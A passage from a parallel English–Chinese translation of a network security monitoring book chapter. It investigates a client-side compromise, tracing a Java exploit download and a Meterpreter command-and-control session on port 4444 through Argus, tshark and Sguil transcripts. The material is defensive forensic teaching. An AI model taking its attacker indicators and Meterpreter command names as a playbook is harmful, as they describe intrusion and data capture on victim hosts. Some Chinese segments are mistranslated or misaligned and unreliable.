  prefs: []
  type: TYPE_NORMAL
  zh: '*203.0.113.15 和目标端口 4444。*'
- en: It’s important to realize that these two destination ports are actually
  id: totrans-850
  prefs: []
  type: TYPE_NORMAL
  zh: 重要的是要意识到，这两个目标端口实际上是
- en: artifacts of packets being exchanged between the computers at 203.0.113.15
  id: totrans-851
  prefs: []
  type: TYPE_NORMAL
  zh: 包交换的遗留物，在203.0.113.15的计算机之间交换。
- en: and 172.16.0.37\. It may be difficult to recognize this because ELSA is sum-
  id: totrans-852
  prefs: []
  type: TYPE_NORMAL
  zh: 和 172.16.0.37。可能很难识别这一点，因为ELSA正在汇总信息。
- en: marizing information captured in Snort alerts and other formats. However,
  id: totrans-853
  prefs: []
  type: TYPE_NORMAL
  zh: 汇总Snort警报和其他格式捕获的信息。然而，
- en: a quick check of the Argus session data makes it easy to understand this
  id: totrans-854
  prefs: []
  type: TYPE_NORMAL
  zh: 快速检查Argus会话数据，可以轻松理解之前提到的Metasploit Meterpreter活动。
- en: important connection, as shown in Listing 11-5\.
  id: totrans-855
  prefs: []
  type: TYPE_NORMAL
  zh: 重要的连接，如列表11-5所示。
- en: $ **racluster -n -r /nsm/sensor_data/sovm-eth1/argus/2013-03-16.log - host 203.0.113.15**
  id: totrans-856
  prefs: []
  type: TYPE_NORMAL
  zh: $ **racluster -n -r /nsm/sensor_data/sovm-eth1/argus/2013-03-16.log - host 203.0.113.15**
- en: StartTime Flgs Proto SrcAddr Sport Dir DstAddr Dport
  id: totrans-857
  prefs: []
  type: TYPE_NORMAL
  zh: StartTime Flgs Proto SrcAddr Sport Dir DstAddr Dport
- en: TotPkts TotBytes State
  id: totrans-858
  prefs: []
  type: TYPE_NORMAL
  zh: TotPkts TotBytes State
- en: 14:16:48.724146 e tcp 172.16.0.37.60320 -> 203.0.113.15.8080u 19 3360 FIN
  id: totrans-859
  prefs: []
  type: TYPE_NORMAL
  zh: 14:16:48.724146 e tcp 172.16.0.37.60320 -> 203.0.113.15.8080u 19 3360 FIN
- en: 14:16:52.544555 e tcp 172.16.0.37.60321 -> 203.0.113.15.8080v 13 1790 FIN
  id: totrans-860
  prefs: []
  type: TYPE_NORMAL
  zh: 14:16:52.544555 e tcp 172.16.0.37.60321 -> 203.0.113.15.8080v 13 1790 FIN
- en: 14:16:52.735852 e tcp 172.16.0.37.60322 -> 203.0.113.15.8080w 27 16164 FIN
  id: totrans-861
  prefs: []
  type: TYPE_NORMAL
  zh: 14:16:52.735852 e tcp 172.16.0.37.60322 -> 203.0.113.15.8080w 27 16164 FIN
- en: 14:16:53.371660 e tcp 172.16.0.37.54056 -> 203.0.113.15.4444x 2802 834486 FIN
  id: totrans-862
  prefs: []
  type: TYPE_NORMAL
  zh: 14:16:53.371660 e tcp 172.16.0.37.54056 -> 203.0.113.15.4444x 2802 834486 FIN
- en: '*Listing 11-5: Argus records for sessions involving 203.0.113.15*'
  id: totrans-863
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-5：涉及 203.0.113.15 的 Argus 记录*'
- en: '**248** Chapter 11'
  id: totrans-864
  prefs: []
  type: TYPE_NORMAL
  zh: '**248** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-865
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: This record shows that 172.16.0.37 connected to 203.0.113.15 four times, as
    shown in the four sessions. The first three sessions connected to port 8080
  id: totrans-866
  prefs: []
  type: TYPE_NORMAL
  zh: 该记录显示172.16.0.37四次连接到203.0.113.15，如四个会话所示。前三个会话连接到端口8080
- en: TCP at u, v, and w. The last session connected to port 4444 TCP x.
  id: totrans-867
  prefs: []
  type: TYPE_NORMAL
  zh: TCP于u、v和w处。最后一个会话连接到端口4444 TCP x。
- en: We can examine these conversations via the full content data as well,
  id: totrans-868
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以通过完整的内容数据来检查这些会话，
- en: and use Tshark to pay attention to the HTTP traffic to port 8080 TCP.
  id: totrans-869
  prefs: []
  type: TYPE_NORMAL
  zh: 并使用Tshark关注到8080 TCP端口的HTTP流量。
- en: Listing 11-6 shows that activity.
  id: totrans-870
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-6 显示了该活动。
- en: $ **tshark -t ad -n -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-16/snort**
  id: totrans-871
  prefs: []
  type: TYPE_NORMAL
  zh: $ **tshark -t ad -n -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-16/snort**
- en: '**.log.1363441666 -R ''tcp.port==8080 and http''**'
  id: totrans-872
  prefs: []
  type: TYPE_NORMAL
  zh: '**.log.1363441666 -R ''tcp.port==8080 and http''**'
- en: 2910 2013-03-16 14:16:48.727696 172.16.0.37 -> 203.0.113.15 HTTP 373
  id: totrans-873
  prefs: []
  type: TYPE_NORMAL
  zh: 2910 2013-03-16 14:16:48.727696 172.16.0.37 -> 203.0.113.15 HTTP 373
- en: GET /healthcarenews HTTP/1.1
  id: totrans-874
  prefs: []
  type: TYPE_NORMAL
  zh: GET /healthcarenews HTTP/1.1
- en: 2912 2013-03-16 14:16:48.729359 203.0.113.15 -> 172.16.0.37 HTTP 200
  id: totrans-875
  prefs: []
  type: TYPE_NORMAL
  zh: 2912 2013-03-16 14:16:48.729359 203.0.113.15 -> 172.16.0.37 HTTP 200
- en: HTTP/1.1 302 Moved
  id: totrans-876
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 302 移动
- en: 2914 2013-03-16 14:16:48.746910 172.16.0.37 -> 203.0.113.15 HTTP 374
  id: totrans-877
  prefs: []
  type: TYPE_NORMAL
  zh: 2914 2013-03-16 14:16:48.746910 172.16.0.37 -> 203.0.113.15 HTTP 374
- en: GET /healthcarenews/ HTTP/1.1
  id: totrans-878
  prefs: []
  type: TYPE_NORMAL
  zh: GET /healthcarenews/ HTTP/1.1
- en: 2915 2013-03-16 14:16:48.752649 203.0.113.15 -> 172.16.0.37 HTTP 291
  id: totrans-879
  prefs: []
  type: TYPE_NORMAL
  zh: 2915 2013-03-16 14:16:48.752649 203.0.113.15 -> 172.16.0.37 HTTP 291
- en: HTTP/1.1 200 OK (text/html)
  id: totrans-880
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 200 OK (text/html)
- en: 2917 2013-03-16 14:16:48.897487 172.16.0.37 -> 203.0.113.15 HTTP 340
  id: totrans-881
  prefs: []
  type: TYPE_NORMAL
  zh: 2917 2013-03-16 14:16:48.897487 172.16.0.37 -> 203.0.113.15 HTTP 340
- en: GET /favicon.ico HTTP/1.1
  id: totrans-882
  prefs: []
  type: TYPE_NORMAL
  zh: GET /favicon.ico HTTP/1.1
- en: 2918 2013-03-16 14:16:48.899164 203.0.113.15 -> 172.16.0.37 HTTP 335
  id: totrans-883
  prefs: []
  type: TYPE_NORMAL
  zh: 2918 2013-03-16 14:16:48.899164 203.0.113.15 -> 172.16.0.37 HTTP 335
- en: HTTP/1.1 404 File not found (text/html)
  id: totrans-884
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 404 未找到文件 (text/html)
- en: 2920 2013-03-16 14:16:48.905587 172.16.0.37 -> 203.0.113.15 HTTP 370
  id: totrans-885
  prefs: []
  type: TYPE_NORMAL
  zh: 2920 2013-03-16 14:16:48.905587 172.16.0.37 -> 203.0.113.15 HTTP 370
- en: GET /favicon.ico HTTP/1.1
  id: totrans-886
  prefs: []
  type: TYPE_NORMAL
  zh: GET /favicon.ico HTTP/1.1
- en: 2921 2013-03-16 14:16:48.908271 203.0.113.15 -> 172.16.0.37 HTTP 335
  id: totrans-887
  prefs: []
  type: TYPE_NORMAL
  zh: 2921 2013-03-16 14:16:48.908271 203.0.113.15 -> 172.16.0.37 HTTP 335
- en: HTTP/1.1 404 File not found (text/html)
  id: totrans-888
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 404 未找到文件 (text/html)
- en: 2926 2013-03-16 14:16:52.560069 172.16.0.37 -> 203.0.113.15 HTTP 415
  id: totrans-889
  prefs: []
  type: TYPE_NORMAL
  zh: 2926 2013-03-16 14:16:52.560069 172.16.0.37 -> 203.0.113.15 HTTP 415
- en: GET /healthcarenews/Exploit.jar.pack.gzu HTTP/1.1
  id: totrans-890
  prefs: []
  type: TYPE_NORMAL
  zh: GET /healthcarenews/Exploit.jar.pack.gzu HTTP/1.1
- en: 2928 2013-03-16 14:16:52.719387 203.0.113.15 -> 172.16.0.37 HTTP 200
  id: totrans-891
  prefs: []
  type: TYPE_NORMAL
  zh: 2928 2013-03-16 14:16:52.719387 203.0.113.15 -> 172.16.0.37 HTTP 200
- en: HTTP/1.1 302 Moved
  id: totrans-892
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 302 移动
- en: 2930 2013-03-16 14:16:52.722747 172.16.0.37 -> 203.0.113.15 HTTP 274
  id: totrans-893
  prefs: []
  type: TYPE_NORMAL
  zh: 2930 2013-03-16 14:16:52.722747 172.16.0.37 -> 203.0.113.15 HTTP 274
- en: GET /healthcarenews/ HTTP/1.1
  id: totrans-894
  prefs: []
  type: TYPE_NORMAL
  zh: GET /healthcarenews/ HTTP/1.1
- en: 2932 2013-03-16 14:16:52.725372 203.0.113.15 -> 172.16.0.37 HTTP 291
  id: totrans-895
  prefs: []
  type: TYPE_NORMAL
  zh: 2932 2013-03-16 14:16:52.725372 203.0.113.15 -> 172.16.0.37 HTTP 291
- en: HTTP/1.1 200 OKx (text/html)
  id: totrans-896
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 200 OKx (text/html)
- en: 2939 2013-03-16 14:16:52.738151 172.16.0.37 -> 203.0.113.15 HTTP 364
  id: totrans-897
  prefs: []
  type: TYPE_NORMAL
  zh: 2939 2013-03-16 14:16:52.738151 172.16.0.37 -> 203.0.113.15 HTTP 364
- en: GET /healthcarenews/Exploit.jarv HTTP/1.1
  id: totrans-898
  prefs: []
  type: TYPE_NORMAL
  zh: GET /healthcarenews/Exploit.jarv HTTP/1.1
- en: 2945 2013-03-16 14:16:53.022853 203.0.113.15 -> 172.16.0.37 HTTP 1138
  id: totrans-899
  prefs: []
  type: TYPE_NORMAL
  zh: 2945 2013-03-16 14:16:53.022853 203.0.113.15 -> 172.16.0.37 HTTP 1138
- en: HTTP/1.1 200 OKy (application/octet-stream)
  id: totrans-900
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 200 OKy (application/octet-stream)
- en: 2951 2013-03-16 14:16:53.037218 172.16.0.37 -> 203.0.113.15 HTTP 406
  id: totrans-901
  prefs: []
  type: TYPE_NORMAL
  zh: 2951 2013-03-16 14:16:53.037218 172.16.0.37 -> 203.0.113.15 HTTP 406
- en: GET /healthcarenews/Exploit.jarw HTTP/1.1
  id: totrans-902
  prefs: []
  type: TYPE_NORMAL
  zh: GET /healthcarenews/Exploit.jarw HTTP/1.1
- en: 2957 2013-03-16 14:16:53.056665 203.0.113.15 -> 172.16.0.37 HTTP 1138
  id: totrans-903
  prefs: []
  type: TYPE_NORMAL
  zh: 2957 2013-03-16 14:16:53.056665 203.0.113.15 -> 172.16.0.37 HTTP 1138
- en: HTTP/1.1 200 OKz (application/octet-stream)
  id: totrans-904
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1 200 OKz (application/octet-stream)
- en: '*Listing 11-6: HTTP traffic from 172.16.0.37 to 203.0.113.15*'
  id: totrans-905
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-6：从172.16.0.37到203.0.113.15的HTTP流量*'
- en: Listing 11-6 contains several troublesome entries. Requests for *Exploit*
  id: totrans-906
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-6 包含几个有问题的条目。对*Exploit*的请求
- en: '*.jar .pack.gz* at u and *Exploit.jar* v w indicate the intruder’s code on
    the victim system is trying to retrieve additional software from the attacking
    system. The'
  id: totrans-907
  prefs: []
  type: TYPE_NORMAL
  zh: '*.jar .pack.gz* 在u处，*Exploit.jar* v w 表示入侵者在受害者系统上的代码正在尝试从攻击系统获取额外的软件。该'
- en: initial code running on the victim is a beachhead, and now it’s calling back
  id: totrans-908
  prefs: []
  type: TYPE_NORMAL
  zh: 在受害者上运行的初始代码是滩头阵地，现在它正在回拨
- en: home for reinforcements. Unfortunately for the victim, those packages are
  id: totrans-909
  prefs: []
  type: TYPE_NORMAL
  zh: 为增援提供根据地。对受害者来说不幸的是，那些包
- en: available and served upon order, as shown by the 200 OK responses x y z.
  id: totrans-910
  prefs: []
  type: TYPE_NORMAL
  zh: 可以根据订单提供并服务，如200 OK响应x y z所示。
- en: This is another way to view activity that started the intrusion. However,
  id: totrans-911
  prefs: []
  type: TYPE_NORMAL
  zh: 这是另一种查看启动入侵活动的方式。然而，
- en: we still need to know what happened after the attack succeeded.
  id: totrans-912
  prefs: []
  type: TYPE_NORMAL
  zh: 我们仍然需要知道攻击成功后发生了什么。
- en: Client-side Compromise **249**
  id: totrans-913
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **249**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-914
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 143](index-284_1.png)'
  id: totrans-915
  prefs: []
  type: TYPE_IMG
  zh: '![Image 143](index-284_1.png)'
- en: '**examining the command-and-control channel**'
  id: totrans-916
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查命令与控制通道**'
- en: From our previous analysis, we know that the intruder pivoted from victim
  id: totrans-917
  prefs: []
  type: TYPE_NORMAL
  zh: 从我们之前的分析中，我们知道入侵者从受害者系统进行了横向移动
- en: 172.16.0.37 to 10.0.0.99, but we don’t know what he did on those two systems.
  id: totrans-918
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37到10.0.0.99，但我们不知道他在这两台系统上做了什么。
- en: Perhaps the traffic involving port 4444 TCP holds the answer. This could
  id: totrans-919
  prefs: []
  type: TYPE_NORMAL
  zh: 也许涉及端口4444 TCP的流量包含答案。这可能
- en: be the command-and-control channel, because it appears immediately after
  id: totrans-920
  prefs: []
  type: TYPE_NORMAL
  zh: 是命令与控制通道，因为它紧接在后出现
- en: the connections to the malicious website.
  id: totrans-921
  prefs: []
  type: TYPE_NORMAL
  zh: 与恶意网站的连接。
- en: To analyze the suspected command-and-control channel, we generate
  id: totrans-922
  prefs: []
  type: TYPE_NORMAL
  zh: 为了分析可疑的指挥与控制通道，我们生成
- en: a transcript for port 4444 traffic using the CapMe feature in ELSA. Click
  id: totrans-923
  prefs: []
  type: TYPE_NORMAL
  zh: 使用CapMe功能为端口4444流量生成转录本。点击
- en: the **Info** button next to the record of interest involving port 4444 to get
    full content data. Figure 11-15 shows how to access CapMe.
  id: totrans-924
  prefs: []
  type: TYPE_NORMAL
  zh: 点击了位于端口4444记录旁边的**信息**按钮，获取完整内容数据。图11-15展示了如何访问CapMe。
- en: '*Figure 11-15: Starting CapMe to generate a transcript for port 4444 traffic*'
  id: totrans-925
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-15：启动CapMe以生成端口4444流量的转录本*'
- en: Click the **getPcap** option, and then click **OK**, to display a new screen
  id: totrans-926
  prefs: []
  type: TYPE_NORMAL
  zh: 点击**getPcap**选项，然后点击**OK**，以显示新屏幕
- en: where we input credentials to access the sensor. Also, for this example, I
  id: totrans-927
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里我们输入凭据以访问传感器。此外，作为这个例子的内容，我
- en: needed to change the Sid Source entry from **sancp** to **event** to help CapMe
    find the right session. When I ran this query originally, CapMe did not find
  id: totrans-928
  prefs: []
  type: TYPE_NORMAL
  zh: 需要将Sid Source条目从**sancp**更改为**event**，以帮助CapMe找到正确的会话。当我最初运行这个查询时，CapMe没有找到
- en: the session with the Sid Source as sancp. The session record was probably
  id: totrans-929
  prefs: []
  type: TYPE_NORMAL
  zh: 会话的Sid Source为sancp。会话记录可能
- en: not loaded yet, so I used the event table to find the data of interest. This
  id: totrans-930
  prefs: []
  type: TYPE_NORMAL
  zh: 尚未加载，因此我使用事件表查找感兴趣的数据。这
- en: approach works only if there is an event (triggered by Snort or Suricata,
  id: totrans-931
  prefs: []
  type: TYPE_NORMAL
  zh: 该方法仅在有事件（由Snort或Suricata触发）时有效，
- en: for example) associated with the traffic. It’s safer to use the sancp table
  id: totrans-932
  prefs: []
  type: TYPE_NORMAL
  zh: 例如）与流量相关的。使用sancp表更安全
- en: as long as the records have been loaded. You may need to wait a few min-
  id: totrans-933
  prefs: []
  type: TYPE_NORMAL
  zh: 只要记录已经加载。你可能需要等待几分钟
- en: utes for the records to load. Figure 11-16 shows the CapMe data request
  id: totrans-934
  prefs: []
  type: TYPE_NORMAL
  zh: 需要等待几分钟以加载记录。图11-16展示了CapMe数据请求
- en: interface.
  id: totrans-935
  prefs: []
  type: TYPE_NORMAL
  zh: 界面。
- en: In this section, we will examine the resulting transcript. At 642KB, it’s
  id: totrans-936
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将检查结果转录本。它大小为642KB，
- en: quite large, and manually examining it for entries of interest is tedious,
  id: totrans-937
  prefs: []
  type: TYPE_NORMAL
  zh: 相当大，手动检查其中感兴趣的条目非常繁琐，
- en: but doing so is our best way to determine what happened to the victim
  id: totrans-938
  prefs: []
  type: TYPE_NORMAL
  zh: 但这样做是我们确定受害者每个时刻发生了什么的最佳方法
- en: systems. We’ll look at excerpts from the transcript and what is happening
  id: totrans-939
  prefs: []
  type: TYPE_NORMAL
  zh: 系统。我们将查看转录本中的摘录以及正在发生的事情
- en: at each point.
  id: totrans-940
  prefs: []
  type: TYPE_NORMAL
  zh: 在每个环节。
- en: '**250** Chapter 11'
  id: totrans-941
  prefs: []
  type: TYPE_NORMAL
  zh: '**250** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-942
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 144](index-285_1.jpg)'
  id: totrans-943
  prefs: []
  type: TYPE_IMG
  zh: '![Image 144](index-285_1.jpg)'
- en: '*Figure 11-16: Configuring CapMe to retrieve a transcript for*'
  id: totrans-944
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-16：配置CapMe以检索转录本*'
- en: '*port 4444 traffic*'
  id: totrans-945
  prefs: []
  type: TYPE_NORMAL
  zh: '*端口4444流量*'
- en: '***Initial Access***'
  id: totrans-946
  prefs: []
  type: TYPE_NORMAL
  zh: '***初始访问***'
- en: The transcript begins with the standard header created by Sguil (which
  id: totrans-947
  prefs: []
  type: TYPE_NORMAL
  zh: 转录本以Sguil创建的标准头开始（如图所示）
- en: handles transcript creation for CapMe, in the background) as shown in
  id: totrans-948
  prefs: []
  type: TYPE_NORMAL
  zh: 负责CapMe转录本创建的（在后台），如图所示
- en: Listing 11-7\. The command-and-control channel is not a cleartext-based
  id: totrans-949
  prefs: []
  type: TYPE_NORMAL
  zh: 列表11-7。指挥与控制通道不是基于明文的
- en: exchange as in previous examples, so be prepared for a lot of extraneous
  id: totrans-950
  prefs: []
  type: TYPE_NORMAL
  zh: 交换，如前面例子中所示，因此要准备好处理大量多余的
- en: characters!
  id: totrans-951
  prefs: []
  type: TYPE_NORMAL
  zh: 字符！
- en: 'Sensor Name: sovm-eth1-1'
  id: totrans-952
  prefs: []
  type: TYPE_NORMAL
  zh: 传感器名称：sovm-eth1-1
- en: 'Timestamp: 2013-03-16 14:17:57'
  id: totrans-953
  prefs: []
  type: TYPE_NORMAL
  zh: 时间戳：2013-03-16 14:17:57
- en: 'Connection ID: .sovm-eth1-1_210'
  id: totrans-954
  prefs: []
  type: TYPE_NORMAL
  zh: 连接ID：.sovm-eth1-1_210
- en: 'Src IP: 172.16.0.37 (Unknown)'
  id: totrans-955
  prefs: []
  type: TYPE_NORMAL
  zh: 源IP：172.16.0.37（未知）
- en: 'Dst IP: 203.0.113.15 (Unknown)'
  id: totrans-956
  prefs: []
  type: TYPE_NORMAL
  zh: 目标IP：203.0.113.15（未知）
- en: 'Src Port: 54056'
  id: totrans-957
  prefs: []
  type: TYPE_NORMAL
  zh: 源端口：54056
- en: 'Dst Port: 4444'
  id: totrans-958
  prefs: []
  type: TYPE_NORMAL
  zh: 目标端口：4444
- en: 'OS Fingerprint: 172.16.0.37:54056 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W6:.:?:?]
    (up: 4 hrs) OS Fingerprint: -> 203.0.113.15:4444 (link: ethernet/modem)'
  id: totrans-959
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统指纹：172.16.0.37:54056 - 未知 [S10:64:1:60:M1460,S,T,N,W6:.:?:?]（运行：4小时） 操作系统指纹：->
    203.0.113.15:4444（链接：以太网/调制解调器）
- en: 'DST: ...........-.'
  id: totrans-960
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...........-.'
- en: 'DST: .........start..E(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V..'
  id: totrans-961
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: .........start..E(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V..'
- en: '*Listing 11-7: Standard transcript header created by Sguil*'
  id: totrans-962
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-7：Sguil创建的标准转录本头*'
- en: Next, the term meterpreter appears, as shown in Listing 11-8\. We’ve already
  id: totrans-963
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，出现了meterpreter术语，如列表11-8所示。我们已经
- en: seen this in the Snort alerts, but the presence of the term here indicates we’re
  id: totrans-964
  prefs: []
  type: TYPE_NORMAL
  zh: 在Snort警报中看到了这个，但是这里出现该术语表示我们正在
- en: dealing with a Meterpreter component of the Metasploit framework.
  id: totrans-965
  prefs: []
  type: TYPE_NORMAL
  zh: 处理Metasploit框架中的Meterpreter组件。
- en: Client-side Compromise **251**
  id: totrans-966
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **251**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-967
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'DST: java/util/Map.......7com/metasploit/**meterpreter**/MemoryBufferURLStreamHandler.............'
  id: totrans-968
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: java/util/Map.......7com/metasploit/**meterpreter**/MemoryBufferURLStreamHandler.............'
- en: getFiles...java/lang/Class........java/lang/Object.....
  id: totrans-969
  prefs: []
  type: TYPE_NORMAL
  zh: getFiles...java/lang/Class........java/lang/Object.....
- en: '*Listing 11-8: The meterpreter reference*'
  id: totrans-970
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-8：meterpreter参考*'
- en: As shown in Listing 11-9, next we see the term sysinfo, followed by
  id: totrans-971
  prefs: []
  type: TYPE_NORMAL
  zh: 如列表 11-9 所示，接下来我们看到术语 sysinfo，后面跟着
- en: what might be a hostname, wirubu32, and a Linux kernel version, Linux
  id: totrans-972
  prefs: []
  type: TYPE_NORMAL
  zh: 可能是一个主机名，wirubu32，以及一个 Linux 内核版本，Linux
- en: 3.5.0-25-generic (i386). The victim system appears to be a Linux i386
  id: totrans-973
  prefs: []
  type: TYPE_NORMAL
  zh: 3.5.0-25-generic (i386)。受害者系统似乎是 Linux i386
- en: platform.
  id: totrans-974
  prefs: []
  type: TYPE_NORMAL
  zh: 平台。
- en: 'SRC: .........."....stdapi_sys_config_**sysinfo**....)....53495413969516947426070095319226.........'
  id: totrans-975
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .........."....stdapi_sys_config_**sysinfo**....)....53495413969516947426070095319226.........'
- en: '**wirubu32**....&.... **Linux 3.5.0-25-generic (i386)**.............'
  id: totrans-976
  prefs: []
  type: TYPE_NORMAL
  zh: '**wirubu32**....&.... **Linux 3.5.0-25-generic (i386)**.............'
- en: 'DST:'
  id: totrans-977
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST:'
- en: '*Listing 11-9: System information*'
  id: totrans-978
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-9：系统信息*'
- en: Next, we see the term desktop_screenshot, as shown in Listing 11-10,
  id: totrans-979
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们看到术语 desktop_screenshot，如列表 11-10 所示，
- en: which is certainly suspicious. This is probably a command to acquire a
  id: totrans-980
  prefs: []
  type: TYPE_NORMAL
  zh: 这无疑是可疑的。这可能是一个获取命令
- en: screen capture of the victim’s desktop.
  id: totrans-981
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者桌面的屏幕截图。
- en: ..Ji.......%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..........
  id: totrans-982
  prefs: []
  type: TYPE_NORMAL
  zh: ..Ji.......%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..........
- en: ..2..I. .....j.x...}|T..0|&s..0..t.AS.u.`.F..I'..2.Q&..k&..`.4M)R.AZ'.....v.i.Gm...../
  id: totrans-983
  prefs: []
  type: TYPE_NORMAL
  zh: ..2..I. .....j.x...}|T..0|&s..0..t.AS.u.`.F..I'..2.Q&..k&..`.4M)R.AZ'.....v.i.Gm...../
- en: '[...V..@...@.Q...WO..X.......g...{.{..{.ym..g.}.^{.'
  id: totrans-984
  prefs: []
  type: TYPE_NORMAL
  zh: '[...V..@...@.Q...WO..X.......g...{.{..{.ym..g.}.^{.'
- en: '*Listing 11-10: The desktop_screenshot command for getting screen captures*'
  id: totrans-985
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-10：获取屏幕截图的 desktop_screenshot 命令*'
- en: This second appearance of a desktop_screenshot command is followed
  id: totrans-986
  prefs: []
  type: TYPE_NORMAL
  zh: 该 desktop_screenshot 命令的第二次出现后
- en: by a JFIF string, as shown in Listing 11-11\. This is probably the header for
  id: totrans-987
  prefs: []
  type: TYPE_NORMAL
  zh: 由 JFIF 字符串组成，如列表 11-11 所示。这可能是其头部
- en: a JPEG File Interchange Format ( JFIF) file.
  id: totrans-988
  prefs: []
  type: TYPE_NORMAL
  zh: 一个 JPEG 文件交换格式（JFIF）文件。
- en: 'SRC: ..........%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..'
  id: totrans-989
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..........%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..'
- en: ..w.......... **JFIF**.............C......
  id: totrans-990
  prefs: []
  type: TYPE_NORMAL
  zh: ..w.......... **JFIF**.............C......
- en: '*Listing 11-11: JFIF reference*'
  id: totrans-991
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-11：JFIF 参考*'
- en: The excerpt in Listing 11-12 shows the net_config_get_interfaces and
  id: totrans-992
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-12 中的摘录显示了 net_config_get_interfaces 和
- en: net_config_get_routes functions. The intruder is probably listing network
  id: totrans-993
  prefs: []
  type: TYPE_NORMAL
  zh: net_config_get_routes 函数。入侵者可能正在列出网络
- en: interfaces and routes on the victim system to see where he sits on the
  id: totrans-994
  prefs: []
  type: TYPE_NORMAL
  zh: 在受害者系统上列出接口和路由，查看他的位置
- en: network.
  id: totrans-995
  prefs: []
  type: TYPE_NORMAL
  zh: 网络。
- en: 'DST: ...Z.......)....stdapi_net_config_get_interfaces....)....90005067652712330016895656875088\.'
  id: totrans-996
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...Z.......)....stdapi_net_config_get_interfaces....)....90005067652712330016895656875088\.'
- en: 'SRC: .'
  id: totrans-997
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..j.......)....stdapi_**net_config_get_interfaces**....)....90005067652712330016895656875088..'
  id: totrans-998
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..j.......)....stdapi_**net_config_get_interfaces**....)....90005067652712330016895656875088..'
- en: '...............@..........|...........z....................eth0 -'
  id: totrans-999
  prefs: []
  type: TYPE_NORMAL
  zh: '...............@..........|...........z....................eth0 -'
- en: eth0...................)..8.............@.......................%...........
  id: totrans-1000
  prefs: []
  type: TYPE_NORMAL
  zh: eth0...................)..8.............@.......................%...........
- en: '.....@..........|...........z..@4................lo - lo.......................................'
  id: totrans-1001
  prefs: []
  type: TYPE_NORMAL
  zh: '.....@..........|...........z..@4................lo - lo.......................................'
- en: '..................................'
  id: totrans-1002
  prefs: []
  type: TYPE_NORMAL
  zh: '..................................'
- en: 'DST: ...V.......%....stdapi_net_config_get_routes....)....34295947967733618834188710122897\.'
  id: totrans-1003
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...V.......%....stdapi_net_config_get_routes....)....34295947967733618834188710122897\.'
- en: '**252** Chapter 11'
  id: totrans-1004
  prefs: []
  type: TYPE_NORMAL
  zh: '**252** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1005
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'SRC: .'
  id: totrans-1006
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..Z.......%....stdapi_**net_config_get_routes**....)....34295947967733618834188710122897.....'
  id: totrans-1007
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..Z.......%....stdapi_**net_config_get_routes**....)....34295947967733618834188710122897.....'
- en: '...........P@.....................)..8.....................................................,@'
  id: totrans-1008
  prefs: []
  type: TYPE_NORMAL
  zh: '...........P@.....................)..8.....................................................,@'
- en: '..............'
